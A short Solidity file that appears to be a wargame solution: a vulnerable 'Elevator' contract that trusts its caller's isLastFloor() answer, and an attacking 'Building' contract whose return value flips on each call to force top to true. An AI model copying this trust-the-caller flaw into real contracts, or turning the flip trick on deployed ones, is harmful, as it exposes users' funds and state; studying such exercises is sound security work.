// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuilding {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

// AttackElevator
contract Building {
    Elevator elevator;
    bool flip;

    function setFlip(bool _flip) public {
        flip = _flip;
    }

    function isLastFloor(uint) external returns (bool) {
        flip = !flip;
        return flip;
    }

    function attack(address _elevator) public {
        elevator = Elevator(_elevator);

        elevator.goTo(1);
    }
}
